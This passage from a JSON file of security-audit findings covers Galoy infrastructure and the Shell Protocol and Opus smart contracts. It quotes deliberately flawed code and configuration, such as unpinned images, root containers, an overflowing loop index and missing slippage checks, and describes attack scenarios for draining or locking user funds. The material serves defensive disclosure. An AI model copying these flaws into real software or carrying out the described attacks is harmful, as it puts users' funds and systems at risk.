charts/lnd/templates/wallet-init-configmap.yaml#55 In Linux, all users can inspect other users commands and their arguments. A user can enable the proc lesystem's hidepid=2 gid=0 mount options to hide metadata about spawned processes from users who are not members of the specied group. However, in many Linux distributions, those options are not enabled by default. Recommendations Short term, take the following actions:   Remove the default encryption keys and avoid using any one default key across installs. The user should be prompted to provide a key when deploying the Galoy application, or the application should generate a key using known-good cryptographically secure methods and provide it to the user for safekeeping. Avoid storing encryption keys in conguration les. Conguration les are often broadly readable or rendered as such accidentally. Long term, ensure that keys, passwords, and other sensitive data are never stored in plaintext in the lesystem, and avoid providing default values for that data. Also take the following steps:    Document the risks of providing sensitive values through environment variables. Encourage developers to pass sensitive values through standard input or to use a launcher that can fetch them from a service like HashiCorp Vault. Allow developers to pass in those values from a conguration le, but document the fact that the conguration le should not be saved in backups, and provide a warning if the le has overly broad permissions when the program is started.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "20. Third-party container images are not version pinned ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Galoy.pdf",
        "body": "The continuous integration (CI) pipeline and Helm charts reference third-party components such as Docker registry images by named tags (or by no tag at all). Registry tags are not immutable; if an attacker compromised an image publishers account, the pipeline or Kubernetes cluster could be provided a malicious container image. 87 - name : build-chain-dl-image 88 89 90 91 92 93 94 95 96 97 98 serial : true plan : - { get : chain-dl-image-def , trigger : true } - task : build privileged : true config : platform : linux image_resource : type : registry-image source : repository : vito/oci-build-task Figure 20.1: A third-party image referenced without an explicit tag ( ci/pipeline.yml#8798 ) 270 resource_types : 271 - name : terraform 272 273 274 275 type : docker-image source : repository : ljfranklin/terraform-resource tag : latest Figure 20.2: An image referenced by the latest tag ( ci/pipeline.yml#270275 ) Exploit Scenario An attacker gains access to a Docker Hub account hosting an image used in the CI pipeline. The attacker then tags a malicious container image and pushes it to Docker Hub. The CI pipeline retrieves the tagged malicious image and uses it to execute tasks. Recommendations Short term, refer to Docker images by SHA-256 digests to prevent the use of an incorrect or modied image. Long term, integrate automated tools such as Checkov into the development workow to detect similar issues in the codebase.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "21. Compute instances do not leverage Shielded VM features ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Galoy.pdf",
        "body": "The bastion host denition does not enable all of Google Clouds Shielded VM (virtual machine) features for Compute Engine VM instances. These features provide veriable integrity of VM instances and assurance that VM instances have not been compromised by boot- or kernel-level malware or rootkits. Three features provide this veriable integrity: Secure Boot, virtual trusted platform module (vTPM)-enabled Measured Boot, and integrity monitoring. Google also oers Shielded GKE nodes, which are built on top of Shielded VMs and provide strong veriable node identity and integrity to increase the security of GKE nodes. The node pool denition does enable this feature but disables Secure Boot checks on the node instances. 168 169 170 shielded_instance_config { enable_secure_boot = false enable_integrity_monitoring = true 171 } Figure 21.1: Secure Boot is disabled. ( modules/platform/gcp/kube.tf#168171 ) Exploit Scenario The bastion host is compromised, and persistent kernel-level malware is installed. Because the bastion host is still operational, the malware remains undetected for an extended period. Recommendations Short term, enable these security features to increase the security and trustworthiness of the infrastructure. Long term, integrate automated analysis tools such as tfsec into the development workow to detect other areas of improvement in the solution. References   What is Shielded VM? , Compute Engine documentation Using GKE Shielded Nodes, GKE documentation",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "22. Excessive container permissions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Galoy.pdf",
        "body": "Kubernetes containers launch processes under user and group IDs corresponding to users and groups on the host system. Container processes that are running as root usually have more permissions than their workload requires. If such a process were compromised, the permissions would enable the attacker to perform further attacks against the container or host. Kubernetes provides several ways to further limit these permissions, such as disabling the allowPrivilegeEscalation ag to ensure that a child process of a container cannot gain more privileges than its parent, dropping all Linux capabilities, and enforcing Seccomp and AppArmor proles. We found several instances of containers run as root, with allowPrivilegeEscalation enabled by omission (gure 22.1) or with low user IDs that overlap with host user IDs (gure 22.2). In some of the containers, Linux capabilities were not dropped (gure 22.2), and neither Seccomp nor AppArmor proles were enabled. 24 containers : 25 - name : auth-backend 26 27 28 29 30 image : \"{{ .Values.image.repository }}@{{ .Values.image.digest }}\" ports : - containerPort : 3000 env : - (...) Figure 22.1: Without a securityContext eld, commands will run as root and a container will allow privilege escalation by default. ( charts/galoy-auth/charts/auth-backend/templates/deployment.yaml#2430 ) 38 39 40 41 42 43 44 45 securityContext : # capabilities: # drop: # - ALL readOnlyRootFilesystem : true runAsNonRoot : true runAsUser : 1000 runAsGroup : 3000 Figure 22.2: User ID 1000 is typically used by the rst non-system user account. ( charts/bitcoind/values.yaml#3845 ) Exploit Scenario An attacker is able to trigger remote code execution in the Web Wallet application. The attacker then leverages the lax permissions to exploit CVE-2022-0185, a buer overow vulnerability in the Linux kernel that allows her to obtain root privileges and escape the Kubernetes pod. The attacker then gains the ability to execute code on the host system. Recommendations Short term, review and adjust the securityContext conguration of all charts used by the Galoy system. Run pods as non-root users with high user IDs that will not overlap with host user IDs. Drop all unnecessary capabilities, and enable security policy enforcement when possible. Long term, integrate automated tools such as Checkov into the CI pipeline to detect areas of improvement in the solution. Additionally, review the Docker recommendations outlined in appendix E . References   Kubernetes container escape using Linux Kernel exploit , CrowdStrike 10 Kubernetes Security Context settings you should understand, snyk",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "23. Unsigned and unversioned Grafana BigQuery Datasource plugin ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Galoy.pdf",
        "body": "The BigQuery Datasource plugin is installed as part of the Grafana conguration found in the Helm charts. The plugin, which is unsigned, is pulled directly from the master branch of the doitintl/bigquery-grafana GitHub repository, and signature checks for the plugin are disabled. Grafana advises against running unsigned plugins. 10 11 plugins : - https://github.com/doitintl/bigquery-grafana/archive/master.zip ;doit-bigquery-dataso urce 12 13 14 15 grafana.ini : plugins : allow_loading_unsigned_plugins : \"doitintl-bigquery-datasource\" Figure 23.1: The plugin is downloaded directly from the GitHub repository, and signature checks are disabled. ( charts/monitoring/values.yaml#1015 ) Exploit Scenario An attacker compromises the doitintl/bigquery-grafana repository and pushes malicious code to the master branch. When Grafana is set up, it downloads the plugin code from the master branch. Because unsigned plugins are allowed, Grafana directly loads the malicious plugin. Recommendations Short term, install the BigQuery Datasource plugin from a signed source such as the Grafana catalog, and disallow the loading of any unsigned plugins. Long term, review the vendor recommendations when conguring new software and avoid disabling security features such as signature checks. When referencing external code and software releases, do so by immutable hash digests instead of named tags or branches to prevent unintended modications. References  Plugin Signatures , Grafana Labs 24. Insu\u0000cient validation of JWTs used for GraphQL subscriptions Severity: Low Diculty: Low Type: Authentication Finding ID: TOB-GALOY-24 Target: galoy/src/servers/graphql-server.ts",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Denial-of-service conditions caused by the use of more than 256 slices ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ShellProtocolv2.pdf",
        "body": "The owner of a Proteus-based automated market maker (AMM) can update the system parameters to cause a denial of service (DoS) upon the execution of swaps, withdrawals, and deposits. The Proteus AMM engine design supports the creation of an arbitrary number of slices. Slices are used to segment an underlying bonding curve and provide variable liquidity across that curve. The owner of a Proteus contract can update the number of slices by calling the _updateSlices function at any point. When a user requests a swap, deposit, or withdrawal operation, the Proteus contract rst calls the _findSlice function (gure 1.1) to identify the slice in which it should perform the operation. The function iterates across the slices array and returns the index, i, of the slice that has the current ratio of token balances, m. function _findSlice(int128 m) internal view returns (uint8 i) { i = 0; while (i < slices.length) { if (m <= slices[i].mLeft && m > slices[i].mRight) return i; unchecked { ++i; } } // while loop terminates at i == slices.length // if we just return i here we'll get an index out of bounds. return i - 1; } Figure 1.1: The _findSlice() function in Proteus.sol#L1168-1179 However, the index, i, is dened as a uint8. If the owner sets the number of slices to at least 257 (by calling _updateSlices) and the current m is in the 257th slice, i will silently overow, and the while loop will continue until an out-of-gas (OOG) exception occurs. If a deposit, withdrawal, or swap requires the 257th slice to be accessed, the operation will fail because the _findSlice function will be unable to reach that slice. Exploit Scenario Eve creates a seemingly correct Proteus-based primitive (one with only two slices near the asymptotes of the bonding curve). Alice deposits assets worth USD 100,000 into a pool. Eve then makes a deposit of X and Y tokens that results in a token balance ratio, m, of 1. Immediately thereafter, Eve calls _updateSlices and sets the number of slices to 257, causing the 256th slice to have an m of 1.01. Because the current m resides in the 257th slice, the _findSlice function will be unable to nd that slice in any subsequent swap, deposit, or withdrawal operation. The system will enter a DoS condition in which all future transactions will fail. If Eve identies an arbitrage opportunity on another exchange, Eve will be able to call _updateSlices again, use the unlocked curve to buy the token of interest, and sell that token on the other exchange for a pure prot. Eectively, Eve will be able to steal user funds. Recommendations Short term, change the index, i, from the uint8 type to uint256; alternatively, create an upper limit for the number of slices that can be created and ensure that i will not overow when the _findSlice function searches through the slices array. Long term, consider adding a delay between a call to _updateSlices and the time at which the call takes eect on the bonding curve. This will allow users to withdraw from the system if they are unhappy with the new parameters. Additionally, consider making slices immutable after their construction; this will signicantly reduce the risk of undened behavior.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. LiquidityPoolProxy owners can steal user funds ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ShellProtocolv2.pdf",
        "body": "The LiquidityPoolProxy contract implements the IOceanPrimitive interface and can integrate with the Ocean contract as a primitive. The proxy contract calls into an implementation contract to perform deposit, swap, and withdrawal operations (gure 2.1). function swapOutput(uint256 inputToken, uint256 inputAmount) public view override returns (uint256 outputAmount) { (uint256 xBalance, uint256 yBalance) = _getBalances(); outputAmount = implementation.swapOutput(xBalance, yBalance, inputToken == xToken ? 0 : 1, inputAmount); } Figure 2.1: The swapOutput() function in LiquidityPoolProxy.sol#L3947 However, the owner of a LiquidityPoolProxy contract can perform the privileged operation of changing the underlying implementation contract via a call to setImplementation (gure 2.2). The owner could thus replace the underlying implementation with a malicious contract to steal user funds. function setImplementation(address _implementation) external onlyOwner { } implementation = ILiquidityPoolImplementation(_implementation); Figure 2.2: The setImplementation() function in LiquidityPoolProxy.sol#L2833 This level of privilege creates a single point of failure in the system. It increases the likelihood that a contracts owner will be targeted by an attacker and incentivizes the owner to act maliciously. Exploit Scenario Alice deploys a LiquidityPoolProxy contract as an Ocean primitive. Eve gains access to Alices machine and upgrades the implementation to a malicious contract that she controls. Bob attempts to swap USD 1 million worth of shDAI for shUSDC by calling computeOutputAmount. Eves contract returns 0 for outputAmount. As a result, the malicious primitives balance of shDAI increases by USD 1 million, but Bob does not receive any tokens in exchange for his shDAI. Recommendations Short term, document the functions and implementations that LiquidityPoolProxy contract owners can change. Additionally, split the privileges provided to the owner role across multiple roles to ensure that no one address has excessive control over the system. Long term, develop user documentation on all risks associated with the system, including those associated with privileged users and the existence of a single point of failure.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. Risk of sandwich attacks ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ShellProtocolv2.pdf",
        "body": "The Proteus liquidity pool implementation does not use a parameter to prevent slippage. Without such a parameter, there is no guarantee that users will receive any tokens in a swap. The LiquidityPool contracts computeOutputAmount function returns an outputAmount value indicating the number of tokens a user should receive in exchange for the inputAmount. Many AMM protocols enable users to specify the minimum number of tokens that they would like to receive in a swap. This minimum number of tokens (indicated by a slippage parameter) protects users from receiving fewer tokens than expected. As shown in gure 3.1, the computeOutputAmount function signature includes a 32-byte metadata eld that would allow a user to encode a slippage parameter. function computeOutputAmount( uint256 inputToken, uint256 outputToken, uint256 inputAmount, address userAddress, bytes32 metadata ) external override onlyOcean returns (uint256 outputAmount) { Figure 3.1: The signature of the computeOutputAmount() function in LiquidityPool.sol#L192198 However, this eld is not used in swaps (gure 3.2) and thus does not provide any protection against excessive slippage. By using a bot to sandwich a users trade, an attacker could increase the slippage incurred by the user and prot o of the spread at the users expense. function computeOutputAmount( uint256 inputToken, uint256 outputToken, uint256 inputAmount, address userAddress, bytes32 metadata ) external override onlyOcean returns (uint256 outputAmount) { ComputeType action = _determineComputeType(inputToken, outputToken); [...] } else if (action == ComputeType.Swap) { // Swap action + computeOutput context => swapOutput() outputAmount = swapOutput(inputToken, inputAmount); emit Swap( inputAmount, outputAmount, metadata, userAddress, (inputToken == xToken), true ); } [...] Figure 3.2: Part of the computeOutputAmount() function in LiquidityPool.sol#L192260 Exploit Scenario Alice wishes to swap her shUSDC for shwETH. Because the computeOutputAmount functions metadata eld is not used in swaps to prevent excessive slippage, the trade can be executed at any price. As a result, when Eve sandwiches the trade with a buy and sell order, Alice sells the tokens without purchasing any, eectively giving away tokens for free. Recommendations Short term, document the fact that protocols that choose to use the Proteus AMM engine should encode a slippage parameter in the metadata eld. The use of this parameter will reduce the likelihood of sandwich attacks against protocol users. Long term, ensure that all calls to computeOutputAmount and computeInputAmount use slippage parameters when necessary, and consider relying on an oracle to ensure that the amount of slippage that users can incur in trades is appropriately limited.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "4. Project dependencies contain vulnerabilities ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ShellProtocolv2.pdf",
        "body": "Although dependency scans did not identify a direct threat to the project under review, npm and yarn audit identied dependencies with known vulnerabilities. Due to the sensitivity of the deployment code and its environment, it is important to ensure that dependencies are not malicious. Problems with dependencies in the JavaScript community could have a signicant eect on the repository under review. The output below details these issues: CVE ID",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "5. Use of duplicate functions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ShellProtocolv2.pdf",
        "body": "The ProteusLogic and Proteus contracts both contain a function used to update the internal slices array. Although calls to these functions currently lead to identical outcomes, there is a risk that a future update could be applied to one function but not the other, which would be problematic. < function _updateSlices(int128[] memory slopes, int128[] memory rootPrices) internal { < require(slopes.length == rootPrices.length); < require(slopes.length > 1); --- > function _updateSlices(int128[] memory slopes, int128[] memory rootPrices) > internal > { > if (slopes.length != rootPrices.length) { > revert UnequalArrayLengths(); > } > if (slopes.length < 2) { > revert TooFewParameters(); > } Figure 5.1: The di between the ProteusLogic and Proteus contracts _updateSlices() functions Using duplicate functions in dierent contracts is not best practice. It increases the risk of a divergence between the contracts and could signicantly aect the system properties. Dening a function in one contract and having other contracts call that function is less risky. Exploit Scenario Alice, a developer of the Shell Protocol, is tasked with updating the ProteusLogic contract. The update requires a change to the Proteus._updateSlices function. However, Alice forgets to update the ProteusLogic._updateSlices function. Because of this omission, the functions updates to the internal slices array may produce dierent results. Recommendations Short term, select one of the two _updateSlices functions to retain in the codebase and to maintain going forward. Long term, consider consolidating the Proteus and ProteusLogic contracts into a single implementation, and avoid duplicating logic.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "6. Certain identity curve congurations can lead to a loss of pool tokens ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ShellProtocolv2.pdf",
        "body": "A rounding error in an integer division operation could lead to a loss of pool tokens and the dilution of liquidity provider (LP) tokens. We reimplemented certain of Cowri Labss fuzz tests and used Echidna to test the system properties specied in the Automated Testing section. The original fuzz testing used a xed amount of 100 tokens for the initial xBalance and yBalance values; after we removed that limitation, Echidna was able to break some of the invariants. The Shell Protocol team should identify the largest possible percentage decrease in pool utility or utility per shell (UPS) to better quantify the impact of a broken invariant on system behavior. In some of the breaking cases, the ratio of token balances, m, was close to the X or Y asymptote of the identity curve. This means that an attacker might be able to disturb the balance of the pool (through ash minting or a large swap, for example) and then exploit the broken invariants. Exploit Scenario Alice withdraws USD 100 worth of token X from a Proteus-based liquidity pool by burning her LP tokens. She eventually decides to reenter the pool and to provide the same amount of liquidity. Even though the curves conguration is similar to the conguration at the time of her withdrawal, her deposit leads to only a USD 90 increase in the pools balance of token X; thus, Alice receives fewer LP tokens than she should in return, eectively losing money because of an arithmetic error. Recommendations Short term, investigate the root cause of the failing properties. Document and test the expected rounding direction (up or down) of each arithmetic operation, and ensure that the rounding direction used in each operation benets the pool. Long term, implement the fuzz testing recommendations outlined in appendix C.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "7. Lack of events for critical operations ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ShellProtocolv2.pdf",
        "body": "Two critical operations do not trigger events. As a result, it will be dicult to review the correct behavior of the contracts once they have been deployed. The LiquidityPoolProxy contracts setImplementation function is called to set the implementation address of the liquidity pool and does not emit an event providing conrmation of that operation to the contracts caller (gure 7.1). function setImplementation(address _implementation) external onlyOwner { } implementation = ILiquidityPoolImplementation(_implementation); Figure 7.1: The setImplementation() function in LiquidityPoolProxy.sol#L2833 Calls to the updateSlices function in the Proteus contract do not trigger events either (gure 7.2). This is problematic because updates to the slices array have a signicant eect on the conguration of the identity curve (TOB-SHELL-1). function updateSlices(int128[] memory slopes, int128[] memory rootPrices) external onlyOwner { } _updateSlices(slopes, rootPrices); Figure 7.2: The updateSlices() function in Proteus.sol#L623628 Without events, users and blockchain-monitoring systems cannot easily detect suspicious behavior. Exploit Scenario Eve, an attacker, is able to take ownership of the LiquidityPoolProxy contract. She then sets a new implementation address. Alice, a Shell Protocol team member, is unaware of the change and does not raise a security incident. Recommendations Short term, add events for all critical operations that result in state changes. Events aid in contract monitoring and the detection of suspicious behavior. Long term, consider using a blockchain-monitoring system to track any suspicious behavior in the contracts. The system relies on several contracts to behave as expected. A monitoring mechanism for critical events would quickly detect any compromised system components.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "8. Ocean may accept unexpected airdrops ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ShellProtocolv2.pdf",
        "body": "Unexpected transfers of tokens to the Ocean contract may break its internal accounting, essentially leading to the loss of the transferred asset. To mitigate this risk, Ocean attempts to reject airdrops. Per the ERC721 and ERC1155 standards, contracts must implement specic methods to accept or deny token transfers. To do this, the Ocean contract uses the onERC721Received and onERC1155Received callbacks and _ERC1155InteractionStatus and _ERC721InteractionStatus storage ags. These storage ags are enabled in ERC721 and ERC1155 wrapping operations to facilitate successful standard-compliant transfers. However, the _erc721Unwrap and _erc1155Unwrap functions also enable the _ERC721InteractionStatus and _ERC1155InteractionStatus ags, respectively. Enabling these ags allows for airdrops, since the Ocean contract, not the user, is the recipient of the tokens in unwrapping operations. function _erc721Unwrap( address tokenAddress, uint256 tokenId, address userAddress, uint256 oceanId ) private { _ERC721InteractionStatus = INTERACTION; IERC721(tokenAddress).safeTransferFrom( address(this), userAddress, tokenId ); _ERC721InteractionStatus = NOT_INTERACTION; emit Erc721Unwrap(tokenAddress, tokenId, userAddress, oceanId); } Figure 8.1: The _erc721Unwrap() function in Ocean.sol#L1020- Exploit Scenario Alice calls the _erc721Unwrap function. When the onERC721Received callback function in Alices contract is called, Alice mistakenly sends the ERC721 tokens back to the Ocean contract. As a result, her ERC721 is permanently locked in the contract and eectively burned. Recommendations Short term, disallow airdrops of standard-compliant tokens during unwrapping interactions and document the edge cases in which the Ocean contract will be unable to stop token airdrops. Long term, when the Ocean contract is expecting a specic airdrop, consider storing the originating address of the transfer and the token type alongside the relevant interaction ag.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "1. Redistributed debt does not accrue interest until next trove action ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-opus-contracts-securityreview.pdf",
        "body": "When a trove becomes eligible for liquidation and the Absorber does not have enough yin to cover the troves debt, a redistribution occurs. A redistribution will take all of the debt and collateral from an unhealthy trove and evenly distribute it among the remaining troves in the system. This has the eect of removing the troves bad debt at the expense of splitting it across other trove owners. When a trove owner takes an action, such as depositing or withdrawing from the system, the charge function is called. This function accrues interest on the troves debt and pulls redistributed debt into the trove: let compounded_trove_debt: Wad = self .compound(trove_id, trove, current_interval); // Pull undistributed debt and update state let trove_yang_balances: Span <YangBalance> = self .get_trove_deposits(trove_id); let (updated_trove_yang_balances, compounded_trove_debt_with_redistributed_debt) = self .pull_redistributed_debt_and_yangs(trove_id, trove_yang_balances, compounded_trove_debt); Figure 1.1: A snippet of the charge function in shrine.cairo#L1412-L1417 However, self.compound is called before the redistributed debt has been pulled into the trove. As a result, the redistributed debt is not charged any interest for the period from the last redistribution to the next trove action . Exploit Scenario A large trove becomes insolvent, and its debt becomes redistributed across all of the troves in the system. Eve waits a signicant amount of time before attempting to withdraw some of her assets. If the interest were accrued on the redistributed debt in her trove, her position would have been insolvent after withdrawal, and she would not have been able to withdraw her assets. However, because the interest was not accrued, she can withdraw her funds successfully. Recommendations Short term, implement a function that calculates the average redistributed debt during a given time frame, and have the system charge interest on said debt. This will ensure that the system accounts for interest on redistributed debt. Long term, improve the unit test coverage to uncover edge cases and ensure that the system behaves as intended. In addition, have the system validate all interest accruals and ensure the principal before compounding is accurate.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "2. Incorrect starting index in the bestow function ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-opus-contracts-securityreview.pdf",
        "body": "The Absorber module acts as a stability pool to help protect trove solvency. Users can stake their yin in the Absorber to earn rewards in the form of absorbed assets (i.e., user collateral received from a liquidation) or excess yin from debt surpluses. The bestow function is used to calculate and allocate these rewards; however, the current_rewards_id starts at 0 instead of LOOP_START . Currently, this is not an issue because the rewards mapping starts at 1 , and, as a result, a current_rewards_id of 0 will be skipped. However, if the reward calculation logic were ever refactored or redesigned, the incorrect index could become problematic. fn bestow ( ref self : ContractState ) { // Defer rewards until at least one provider deposits let total_shares: Wad = self .total_shares.read(); if !is_operational_helper(total_shares) { return ; } // Trigger issuance of active rewards let total_recipient_shares: Wad = total_shares - INITIAL_SHARES.into(); let epoch: u32 = self .current_epoch.read(); let mut blessed_assets: Array <AssetBalance> = ArrayTrait::new(); let mut current_rewards_id: u8 = 0 ; let loop_end: u8 = self .rewards_count.read() + REWARDS_LOOP_START; loop { if current_rewards_id == loop_end { break ; } let reward: Reward = self .rewards.read(current_rewards_id); if !reward.is_active { current_rewards_id += 1 ; continue ; } [...] Figure 2.1: Part of the bestow function in absorber.cairo#L912-L936 Recommendations Short term, update the index to start at 1 . Long term, carefully review the upper and lower bounds of loops, especially when the codebase uses both 0 -indexed and 1 -indexed loops.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "3. MAX_YANG_RATE is set lower than intended ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-opus-contracts-securityreview.pdf",
        "body": "The MAX_YANG_RATE constant represents the maximum interest rate that can be set for any yang used in the system. This value is stored as a xed-point number with 27 decimals (i.e., a ray unit). The comment above the declaration states that this value should be 1 ray, but the actual declaration sets it to 0.1 ray (i.e., 1e26). As a result, the system does not support base interest rates above 10%. Note that the USE_PREV_BASE_RATE constant, which the code comments dene relative to MAX_YANG_RATE , is set to the correct expected value (i.e., 1e27 + 1). // Maximum interest rate a yang can have (ray): RAY_ONE const MAX_YANG_RATE: u128 = 100000000000000000000000000 ; // Flag for setting the yang's new base rate to its previous base rate in `update_rates` // (ray): MAX_YANG_RATE + 1 const USE_PREV_BASE_RATE: u128 = 1000000000000000000000000001 ; Figure 3.1: The declaration of the MAX_YANG_RATE and USE_PREV_BASE_RATE constants in shrine.cairo#L6368 Recommendations Short term, correct the MAX_YANG_RATE constant to be initialized to the correct value. Long term, improve the unit test coverage to ensure that the system behaves as intended.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "4. LOWER_UPDATE_FREQUENCY_BOUND is set much lower than Starknet block time ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-opus-contracts-securityreview.pdf",
        "body": "To monitor and determine the frequency with which price feeds for a given yang in the Shrine can be updated per block (using the update_price function), the Seer module has an update_frequency state variable. Currently, the lower bound on the update frequency is set to 15 seconds, and the surrounding comments state that the goal is that the price can be updated at least every block. However, the current block time is typically much higher than that (around 23 minutes), and the Starknet documentation states that the average block time is 3 minutes. const LOWER_UPDATE_FREQUENCY_BOUND: u64 = 15 ; // seconds (approx. Starknet block prod goal) Figure 4.1: The declaration of the LOWER_FREQUENCY_UPDATE_BOUND constant in seer.cairo#L29 fn set_update_frequency ( ref self : ContractState , new_frequency: u64 ) { self .access_control.assert_has_role(seer_roles::SET_UPDATE_FREQUENCY); assert( LOWER_UPDATE_FREQUENCY_BOUND <= new_frequency && new_frequency <= UPPER_UPDATE_FREQUENCY_BOUND, ' SEER: Frequency out of bounds ' ); [...] Figure 4.2: The frequency update bounds check in the set_update_frequency function in seer.cairo#L156-L161 Exploit Scenario Bob, a developer at Lindy Labs, sets the update_frequency variable to the lowest possible value, 15 seconds, with the purpose of letting the keeper update the price every single block. However, this update frequency allows the keeper to call update_frequency many times per block, consuming keeper credits. Recommendations Short term, set the LOWER_UPDATE_FREQUENCY_BOUND variable to 180 seconds, which is in line with the expected Starknet block production time. Long term, keep up to date with the Starknet documentation, and ensure that constants and system parameters are in accordance with it.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. The absorb function can still be called even if the Absorber is killed ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-opus-contracts-securityreview.pdf",
        "body": "The Absorber module is responsible for being a backstop against unhealthy troves. Similar to the Shrine , the Absorber module can be killed by the admin of the Opus system. When it is killed, providing yin to the Absorber becomes impossible; the only possible actions stakers can take are reaping collateral rewards, requesting to remove their provided yin, or removing their yin from the Absorber entirely. However, liquidations using the stability pool are still possible even when the Absorber is killed, as the absorb function does not check that the Absorber is live: fn absorb ( ref self : ContractState , trove_id: u64 ) -> Span <AssetBalance> { [...] // If the absorber is operational, cap the purge amount to the absorber's balance // (including if it is zero). let purge_amt = if absorber.is_operational() { min(max_purge_amt, shrine.get_yin(absorber.contract_address)) } else { WadZeroable::zero() }; [...] Figure 5.1: Part of the absorb function in purger.cairo#L265-L291 #[inline(always)] fn is_operational_helper ( total_shares : Wad ) -> bool { total_shares >= MINIMUM_SHARES.into() } Figure 5.2: The is_operational_helper function in absorber.cairo#L1102-L1106 Exploit Scenario Due to a bug in the Absorber contract, the admin of the Opus system kills the Absorber , with the intention to migrate the yin and rewards to a newly deployed Absorber contract that patches the issue. However, Eve calls the absorb function, which triggers a redistribution on an unhealthy troves debt and uses up the Absorber s yin. In addition, this also updates the epoch, allowing yin providers to earn extra rewards than intended. Recommendations Short term, enforce that the absorb function cannot be called unless the Absorber is live. Long term, improve the unit test coverage to uncover edge cases and ensure that the system behaves as intended. Ensure that all system features are appropriately disabled during component shutdowns, and document invariants that should hold when the system components are not live.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "6. The get_shrine_health function does not account for interest or recovery mode threshold ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-opus-contracts-securityreview.pdf",
        "body": "The Shrine is the main accounting module in the system. It keeps track of open troves, the total yang deposited in the system, and the weighted yang threshold. To get the total system health, the get_shrine_health function is used: // Returns a Health struct comprising the Shrine's threshold, LTV, value and debt; fn get_shrine_health ( self : @ContractState ) -> Health { let (threshold, value) = self .get_threshold_and_value( self .get_shrine_deposits(), now()); let debt: Wad = self .total_troves_debt.read(); // If no collateral has been deposited, then shrine's LTV is // returned as the maximum possible value. let ltv: Ray = if value.is_zero() { BoundedRay::max() } else { wadray::rdiv_ww(debt, value) }; Health { threshold, ltv, value, debt } } Figure 6.1: The get_shrine_health function in shrine.cairo#L512-L526 However, this function fails to account for any interest or pulled redistributed debt, as the charge function, which accrues interest, is never called. In addition, the get_threshold_and_value function, which determines the weighted threshold, does not check whether recovery mode is active. Exploit Scenario The Shrine enters recovery mode, and the Caretaker attempts to gracefully shut down the system. Alice, the admin of the Opus contracts, calls shut . However, the lack of interest accrued on the debt causes trove owners to be able to withdraw more collateral than originally intended. Recommendations Short term, have the get_shrine_health function call the charge function for every trove to ensure that interest is accrued. Long term, improve the unit test coverage to uncover edge cases and ensure that the system behaves as intended.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "7. Yin cannot be pulled out of the Absorber if the Shrine is killed ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-opus-contracts-securityreview.pdf",
